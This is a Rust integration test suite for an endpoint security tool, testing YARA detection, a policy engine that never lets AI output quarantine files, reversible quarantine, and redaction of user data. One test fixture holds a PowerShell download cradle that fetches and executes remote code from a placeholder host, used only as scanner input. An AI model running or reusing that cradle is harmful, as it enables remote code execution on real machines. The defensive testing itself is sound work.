//! Cross-layer integration tests: scanner -> policy -> storage -> telemetry.
//!
//! These tests do not touch the network, do not execute any scanned file and do
//! not require Windows package identity. Windows-only features degrade to
//! documented fallbacks.

use security_core::{
    DecisionCategory, DecisionResult, FileRef, PolicyOutcome, RiskAssessment, RiskSignals,
    ScanSource, SecurityEvent, SecurityEventKind, Severity, TelemetrySource,
};
use security_policy::{PolicyConfig, PolicyEngine};
use security_scanner::{compute_sha256, QuarantineVault, Scanner, ScannerConfig};
use security_storage::{Database, EventFilter};
use security_telemetry::CorrelationEngine;

/// A PowerShell download cradle. This is a textual test fixture used to
/// exercise the bundled YARA rule; it is never executed.
const DOWNLOAD_CRADLE: &str =
    "$wc = New-Object Net.WebClient; IEX $wc.DownloadString('https://example.invalid/payload')";

#[test]
fn yara_detection_flows_through_policy_and_storage() {
    let dir = tempfile::tempdir().expect("tempdir");
    let file_path = dir.path().join("script-test.ps1");
    std::fs::write(&file_path, DOWNLOAD_CRADLE).expect("write fixture");

    let scanner = Scanner::new(ScannerConfig::default()).expect("scanner");
    let report = scanner
        .scan_file(&file_path, ScanSource::Manual)
        .expect("scan file");

    assert!(
        !report.detections.is_empty(),
        "the PowerShell download-cradle fixture must trigger a bundled YARA rule"
    );
    assert!(report.assessment.score > 0.0);
    assert!(!report.cache_hit);

    // Defaults: auto-quarantine is off, so even a detection must not result in
    // a quarantine outcome.
    let default_policy = PolicyEngine::new(PolicyConfig::default());
    let decision = default_policy.evaluate_scan(&report, None);
    assert_ne!(decision.outcome, PolicyOutcome::Quarantine);
    assert!(decision.deterministic);

    // Opt-in deterministic quarantine: enabled, hash requirement waived, YARA
    // match present. This is the only path that may quarantine.
    let enabled_policy = PolicyEngine::new(PolicyConfig {
        auto_quarantine_enabled: true,
        auto_quarantine_min_score: 40.0,
        auto_quarantine_requires_known_hash: false,
        ..PolicyConfig::default()
    });
    let decision = enabled_policy.evaluate_scan(&report, None);
    assert_eq!(decision.outcome, PolicyOutcome::Quarantine);
    assert!(decision.quarantine_allowed);
    assert!(decision.deterministic);

    // The detection is persisted as a security event and queried back.
    let db = Database::open_in_memory().expect("in-memory database");
    let mut event = SecurityEvent::new(
        SecurityEventKind::Detection,
        Severity::High,
        TelemetrySource::FileScanner,
        "Script detection",
    );
    event.file = Some(report.file.clone());
    event.detections = report.detections.clone();
    event.assessment = Some(report.assessment.clone());
    db.insert_event(&event).expect("insert event");
    let page = db
        .query_events(
            &EventFilter {
                kind: Some(SecurityEventKind::Detection),
                ..Default::default()
            }
            .bounded(),
        )
        .expect("query events");
    assert_eq!(page.total, 1);
    assert_eq!(page.items[0].file.as_ref().unwrap().name, "script-test.ps1");
}

#[test]
fn ai_output_can_never_quarantine() {
    let policy = PolicyEngine::new(PolicyConfig {
        auto_quarantine_enabled: true,
        auto_quarantine_requires_known_hash: false,
        ..PolicyConfig::default()
    });
    let assessment = RiskAssessment::from_signals(RiskSignals {
        known_malware_hash: true,
        yara_matches: 3,
        ransomware_indicator: true,
        credential_access_indicator: true,
        ..Default::default()
    });
    let ai = DecisionResult {
        id: security_core::new_id("dec"),
        provider: "test".into(),
        model: "test-model".into(),
        model_version: None,
        category: DecisionCategory::LikelyMalicious,
        probabilities: Default::default(),
        confidence: 1.0,
        requires_investigation: true,
        suspicious_persistence: true,
        credential_theft: true,
        ransomware: true,
        latency_ms: 1,
        timestamp_ms: chrono::Utc::now().timestamp_millis(),
        evidence: vec!["malicious".into()],
        cost_usd: None,
        escalated: false,
    };

    let decision = policy.evaluate_ai_only(&ai, &assessment);
    assert_ne!(
        decision.outcome,
        PolicyOutcome::Quarantine,
        "AI output must never produce a quarantine decision"
    );
    assert!(!decision.quarantine_allowed);
}

#[test]
fn correlation_and_timeline_storage_are_consistent() {
    let db = Database::open_in_memory().expect("in-memory database");
    let mut engine = CorrelationEngine::default();

    let mut created = SecurityEvent::new(
        SecurityEventKind::ProcessCreated,
        Severity::Info,
        TelemetrySource::ProcessSnapshot,
        "unsigned.exe",
    );
    created.process = Some(security_core::ProcessRef {
        pid: 9001,
        name: "unsigned.exe".into(),
        path: Some(r"C:\Temp\unsigned.exe".into()),
        parent_name: Some("powershell.exe".into()),
        signed: Some(false),
        ..Default::default()
    });
    created.assessment = Some(RiskAssessment::from_signals(RiskSignals {
        unsigned_executable: true,
        suspicious_parent: true,
        temp_execution: true,
        obfuscated_script: true,
        ..Default::default()
    }));
    db.insert_event(&created).expect("insert created event");
    let first = engine.ingest(&created);
    assert_eq!(first.len(), 1);
    let correlation_id = first[0]
        .correlation_id
        .clone()
        .expect("correlation id present");

    let mut persistence = SecurityEvent::new(
        SecurityEventKind::PersistenceIndicator,
        Severity::Medium,
        TelemetrySource::Correlation,
        "Startup folder write",
    );
    persistence.process = created.process.clone();
    persistence.labels = vec!["signal:persistence".into(), "signal:startup_write".into()];
    let second = engine.ingest(&persistence);
    assert_eq!(second.len(), 1, "score-band escalation emits once");
    assert_eq!(
        second[0].correlation_id.as_deref(),
        Some(correlation_id.as_str())
    );

    for event in first.iter().chain(second.iter()) {
        db.insert_event(event).expect("insert correlated event");
    }
    let related = db
        .events_by_correlation(&correlation_id)
        .expect("related events");
    assert!(related.len() >= 2);
    assert!(related
        .iter()
        .any(|event| event.kind == SecurityEventKind::Correlation));

    // The policy engine independently classifies the same correlation chain as
    // worth investigating (never quarantine from behavior alone).
    let policy = PolicyEngine::new(PolicyConfig::default());
    let decision = policy.evaluate_event(&second[0]);
    assert!(decision.outcome >= PolicyOutcome::Investigate);
    assert_ne!(decision.outcome, PolicyOutcome::Quarantine);

    // Provider health persistence round-trips through the same database.
    let health = security_core::ProviderHealth {
        provider: "openrouter".into(),
        model: "inception/mercury-decide".into(),
        status: security_core::ProviderStatus::Healthy,
        successes: 3,
        failures: 1,
        last_latency_ms: Some(412),
        last_error: None,
        total_cost_usd: 0.004,
        requests: 4,
        checked_at_ms: chrono::Utc::now().timestamp_millis(),
    };
    db.upsert_provider_health(&health).expect("upsert health");
    let stored = db.provider_health().expect("read health");
    assert_eq!(stored.len(), 1);
    assert_eq!(stored[0].model, health.model);
    assert_eq!(stored[0].successes, 3);
}

#[test]
fn scanner_exclusions_skip_directory_trees() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().join("root");
    let included = root.join("included.txt");
    let excluded_dir = root.join("excluded");
    let excluded_file = excluded_dir.join("secret.txt");
    std::fs::create_dir_all(&excluded_dir).expect("create dirs");
    std::fs::write(&included, "benign fixture").expect("write included");
    std::fs::write(&excluded_file, "benign fixture").expect("write excluded");

    let scanner = Scanner::new(ScannerConfig {
        exclusions: vec![excluded_dir.to_string_lossy().into_owned()],
        ..ScannerConfig::default()
    })
    .expect("scanner");

    let cancel = std::sync::atomic::AtomicBool::new(false);
    let summary = scanner.scan_path(&root, true, &cancel, &|_| {});
    assert!(!summary.cancelled);
    assert_eq!(
        summary.reports.len(),
        1,
        "only the non-excluded file is scanned"
    );
    assert_eq!(summary.reports[0].file.name, "included.txt");
    assert!(
        summary
            .reports
            .iter()
            .all(|report| report.file.name != "secret.txt"),
        "excluded directory must not be traversed"
    );
}

#[test]
fn quarantine_copy_is_verified_and_restorable() {
    let dir = tempfile::tempdir().expect("tempdir");
    let vault_dir = dir.path().join("vault");
    let vault = QuarantineVault::new(vault_dir).expect("vault");

    let original = dir.path().join("suspicious.bin");
    let bytes = b"not actually malware; a reversible quarantine test fixture";
    std::fs::write(&original, bytes).expect("write fixture");
    let expected_hash = compute_sha256(&original).expect("hash fixture");

    let record = vault
        .quarantine(&original, "integration test", None)
        .expect("quarantine");
    assert_eq!(record.sha256, expected_hash);
    assert!(record.identity_verified);
    assert!(std::path::Path::new(&record.stored_path).exists());

    // Copy-only: the original is untouched until the operator restores.
    assert!(original.exists());
    assert_eq!(std::fs::read(&original).expect("read original"), bytes);

    // Persist audit metadata and verify the status transition.
    let db = Database::open_in_memory().expect("db");
    db.insert_quarantine(&record).expect("insert quarantine");
    assert_eq!(db.list_quarantine(10).expect("list").len(), 1);

    // Restore refuses to overwrite the existing original.
    let refused = vault.restore(&record.id).expect("restore attempt");
    assert!(!refused.success);

    std::fs::remove_file(&original).expect("simulate user removing original");
    let restored = vault.restore(&record.id).expect("restore");
    assert!(restored.success);
    assert_eq!(
        restored.restored_path.as_deref(),
        Some(record.original_path.as_str())
    );
    assert_eq!(std::fs::read(&original).expect("read restored"), bytes);
    assert_eq!(compute_sha256(&original).expect("rehash"), expected_hash);

    db.update_quarantine_status(
        &record.id,
        security_core::QuarantineStatus::Restored,
        Some(chrono::Utc::now().timestamp_millis()),
    )
    .expect("update status");
    let records = db.list_quarantine(10).expect("list after restore");
    assert_eq!(records[0].status, security_core::QuarantineStatus::Restored);
}

#[test]
fn cloud_state_redaction_removes_paths_users_and_full_hashes() {
    let mut event = SecurityEvent::new(
        SecurityEventKind::Detection,
        Severity::High,
        TelemetrySource::FileScanner,
        "redaction test",
    );
    let full_hash = "a".repeat(64);
    event.file = Some(FileRef {
        path: r"C:\Users\alice\Downloads\totally-suspicious.exe".into(),
        name: "totally-suspicious.exe".into(),
        size: 1024,
        sha256: Some(full_hash.clone()),
        ..Default::default()
    });
    event.process = Some(security_core::ProcessRef {
        pid: 10,
        name: "totally-suspicious.exe".into(),
        path: Some(r"C:\Users\alice\AppData\Local\Temp\totally-suspicious.exe".into()),
        command_line: Some(
            r"C:\Users\alice\AppData\Local\Temp\totally-suspicious.exe --token secret".into(),
        ),
        user: Some("alice".into()),
        ..Default::default()
    });
    let assessment = RiskAssessment::from_signals(RiskSignals {
        unsigned_executable: true,
        high_entropy: true,
        ..Default::default()
    });

    let state = ai_decisions::build_decision_state(&event, &assessment);
    let redacted = ai_decisions::redact_state(&state);
    let serialized = serde_json::to_string(&redacted).expect("serialize redacted state");

    assert!(!serialized.contains("alice"), "usernames must be redacted");
    assert!(
        !serialized.contains(r"C:\Users"),
        "absolute user paths must be reduced to file names"
    );
    assert!(
        !serialized.contains(&full_hash),
        "full SHA-256 hashes must not leave the machine"
    );
    if let Some(prefix) = &redacted.file.as_ref().and_then(|f| f.sha256_prefix.clone()) {
        assert!(prefix.len() <= 8, "hash prefix length is bounded");
    }
}
